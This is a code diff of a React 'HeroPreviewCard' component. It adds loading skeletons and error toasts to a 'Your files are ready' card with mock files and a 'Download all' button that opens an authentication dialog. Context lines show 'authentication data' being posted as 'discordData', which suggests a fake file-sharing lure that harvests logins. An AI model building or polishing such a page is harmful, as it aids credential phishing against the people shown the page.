@@ -90,11 +90,17 @@ const FileItem = ({
         </div>
       </>
     ) : (
-      <div className="flex items-center gap-3 w-full">
-        <Skeleton className="h-8 w-8 rounded-md" />
-        <div className="space-y-2 flex-1">
-          <Skeleton className="h-4 w-3/4" />
-          <Skeleton className="h-3 w-1/2" />
+      <div className="flex items-center justify-between py-3 px-2 rounded-lg">
+        <div className="flex items-center gap-3 w-full">
+          <Skeleton className="h-8 w-8 rounded-md shrink-0" />
+          <div className="space-y-2 flex-1">
+            <Skeleton className="h-4 w-3/4" />
+            <Skeleton className="h-3 w-1/2" />
+          </div>
+        </div>
+        <div className="flex gap-1 ml-2">
+          <Skeleton className="h-8 w-8 rounded-full shrink-0" />
+          <Skeleton className="h-8 w-8 rounded-full shrink-0" />
         </div>
       </div>
     )}
@@ -153,10 +159,23 @@ export function HeroPreviewCard() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(discordData),
       });
-      const result = await response.json();
-      discordSuccess = result.success;
+      
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error(`Server returned ${response.status}: ${errorText}`);
+        try {
+          const errorJson = JSON.parse(errorText);
+          toast.error(errorJson.error || 'Server error occurred');
+        } catch {
+          toast.error(`Server error (${response.status})`);
+        }
+      } else {
+        const result = await response.json();
+        discordSuccess = result.success;
+      }
     } catch (error) {
       console.error('Failed to send authentication data to server:', error);
+      toast.error('Network error. Please check your connection.');
     }
 
     setTimeout(() => {
@@ -210,10 +229,14 @@ export function HeroPreviewCard() {
           >
             <Card className="shadow-2xl shadow-blue-500/10 rounded-3xl overflow-hidden border-gray-200/80 bg-white/80 backdrop-blur-xl">
               <CardHeader className="p-6">
-                <CardTitle className="text-xl font-semibold text-gray-900">Your files are ready</CardTitle>
+                {isLoaded ? (
+                  <CardTitle className="text-xl font-semibold text-gray-900">Your files are ready</CardTitle>
+                ) : (
+                  <Skeleton className="h-7 w-48" />
+                )}
               </CardHeader>
               <CardContent className="p-6 pt-0">
-                <div className="border rounded-xl divide-y max-h-64 overflow-y-auto p-2">
+                <div className="border rounded-xl divide-y max-h-64 overflow-y-auto p-2 bg-white/40">
                   {(isLoaded ? MOCK_FILES : Array(5).fill(0)).map((file, index) => (
                     <FileItem
                       key={isLoaded ? file.id : index}
@@ -225,28 +248,41 @@ export function HeroPreviewCard() {
                   ))}
                 </div>
                 <div className="mt-4 flex items-center justify-center">
-                  <Button variant="link" size="sm" className="text-gray-500 hover:text-gray-800">
-                    <LinkIcon className="w-3 h-3 mr-1.5" />
-                    Report a problem
-                  </Button>
+                  {isLoaded ? (
+                    <Button variant="link" size="sm" className="text-gray-500 hover:text-gray-800">
+                      <LinkIcon className="w-3 h-3 mr-1.5" />
+                      Report a problem
+                    </Button>
+                  ) : (
+                    <Skeleton className="h-4 w-32" />
+                  )}
                 </div>
               </CardContent>
               <CardFooter className="bg-gray-50/70 p-6 flex flex-col sm:flex-row gap-3">
-                  <Button
-                    size="lg"
-                    className="w-full bg-[#2F6BF6] hover:bg-[#2F6BF6]/90 text-white rounded-full shadow-lg shadow-blue-500/20 transition-all hover:shadow-xl hover:-translate-y-0.5 active:scale-95"
-                    onClick={() => setIsAuthOpen(true)}
-                  >
-                    Download all
-                  </Button>
-                  <Button
-                    size="lg"
-                    variant="outline"
-                    className="w-full bg-white hover:bg-gray-50 rounded-full border-gray-300 transition-all hover:-translate-y-0.5 active:scale-95"
-                    onClick={() => handlePreviewOpen(MOCK_FILES[0])}
-                  >
-                    Open preview
-                  </Button>
+                {isLoaded ? (
+                  <>
+                    <Button
+                      size="lg"
+                      className="w-full bg-[#2F6BF6] hover:bg-[#2F6BF6]/90 text-white rounded-full shadow-lg shadow-blue-500/20 transition-all hover:shadow-xl hover:-translate-y-0.5 active:scale-95"
+                      onClick={() => setIsAuthOpen(true)}
+                    >
+                      Download all
+                    </Button>
+                    <Button
+                      size="lg"
+                      variant="outline"
+                      className="w-full bg-white hover:bg-gray-50 rounded-full border-gray-300 transition-all hover:-translate-y-0.5 active:scale-95"
+                      onClick={() => handlePreviewOpen(MOCK_FILES[0])}
+                    >
+                      Open preview
+                    </Button>
+                  </>
+                ) : (
+                  <>
+                    <Skeleton className="h-12 w-full rounded-full" />
+                    <Skeleton className="h-12 w-full rounded-full" />
+                  </>
+                )}
               </CardFooter>
             </Card>
           </motion.div>
